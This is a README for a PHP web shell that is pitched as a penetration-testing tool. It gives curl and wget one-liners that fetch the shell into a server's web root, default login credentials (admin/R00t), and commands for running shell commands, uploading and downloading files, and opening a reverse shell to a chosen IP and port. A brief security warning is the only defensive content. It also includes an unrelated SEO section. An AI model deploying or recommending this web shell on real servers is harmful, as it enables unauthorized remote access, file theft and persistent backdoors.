
# PHP SSH Shell - User Guide
The **php-shell** is a simple and user-friendly PHP web shell designed for penetration testing purposes. It allows users to execute shell commands on a server directly through a web interface, facilitating tasks such as command execution, file uploads, and downloads.

![PHP SSH Shell](https://r00t-shell.com/wp-content/uploads/2025/02/PHP-SSH-Shell.png "PHP SSH Shell")


### Username
```bash
admin
```
### Password
```bash
R00t
```

## Key Features ⚙️

- **Command Execution**: Run shell commands directly from the web interface.
- **File Management**: Upload and download files to and from the server.
- **Session Management**: Utilize command history navigation with arrow keys.

## How to Use php-shell 📜

### Download and Deployment 💻

To deploy `php-shell`, use `curl` or `wget` to download the `PHP-SSH-Shell.php` file to your server's web directory:

```bash
curl https://raw.githubusercontent.com/RootShelll/PHP-SSH-Shell/refs/heads/main/PHP-SSH-Shell.php -o /var/www/html/PHP-SSH-Shell.php
```

or

```bash
wget https://raw.githubusercontent.com/RootShelll/PHP-SSH-Shell/refs/heads/main/PHP-SSH-Shell.php -O /var/www/html/PHP-SSH-Shell.php
```

After downloading, access the shell via your web browser:  
**http://yourserver.com/PHP-SSH-Shell.php**

### Command Interface ⌨️

#### Executing Commands 🖥️

Type your desired shell command and press Enter to execute.

#### Navigating Command History 🔄

Use the Up and Down arrow keys to scroll through previous commands.

#### Special Commands 🔧

- `exit`: Logs out of the shell session.
- `cd [directory]`: Changes the current directory.
- `cls`: Clears the command output on the screen.
- `rshell [IP] [PORT]`: Initiates a reverse shell to the specified IP and port.
- `upload`: Prompts for a file to upload to the current directory.
- `download [file]`: Downloads the specified file from the server.

### Security Considerations 🔒

Deploying **php-shell** poses significant security risks, as it grants extensive access to the server. It is imperative to use this tool exclusively in controlled environments, such as during authorized penetration testing, and ensure it is removed immediately after use to prevent unauthorized access.

### SEO Optimization 🔍

To ensure the php-shell page is optimized for search engines:

- **Meta Tags**: Include relevant meta tags in the `<head>` section.
- **Header Tags**: Use appropriate header tags (`<h1>`, `<h2>`, etc.) to structure your content.
- **Alt Text for Images**: Provide descriptive alt text for images to improve accessibility and SEO.

## Comprehensive Usage Guide 🛠️

For users unfamiliar with web shells, **php-shell** serves as a web-based interface that allows you to execute shell commands on a server directly from your browser. This can be particularly useful for system administrators and developers who need to manage servers without direct terminal access.

### Step-by-Step Instructions 📝

#### Setup 🏗️

1. Download the `PHP-SSH-Shell.php` file to your server's web directory using `curl` or `wget`.
2. Ensure the web server has the necessary permissions to execute PHP scripts.

#### Accessing the Shell 🌐

Open your web browser and navigate to:  
**http://yourserver.com/PHP-SSH-Shell.php**

You will be presented with a command input field where you can enter your shell commands.

#### Executing Commands 🖱️

Type any valid shell command into the input field and press Enter. The output of the command will be displayed on the screen.

#### Uploading Files 📤

Type `upload` and press Enter. A file selection dialog will appear. Choose the file you wish to upload. The selected file will be uploaded to the current directory on the server.

#### Downloading Files 📥

Type `download [filename]` (replace `[filename]` with the actual file name) and press Enter. The specified file will be downloaded to your local machine.

---

### Login Form Example 🔑

```html
<div class="login-form">
    <h2>Shell login password</h2>
    <input type="text" value="admin">
    <input value="R00t" required>
</div>
```
![PHP SSH Shell](https://r00t-shell.com/wp-content/uploads/2025/02/PHP-SSH-Shell.png "PHP SSH Shell")
![PHP SSH Shell Login](https://r00t-shell.com/wp-content/uploads/2025/02/PHP-SSH-Shell-login-panel-1.png "PHP SSH Shell Login")

### License 📄

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
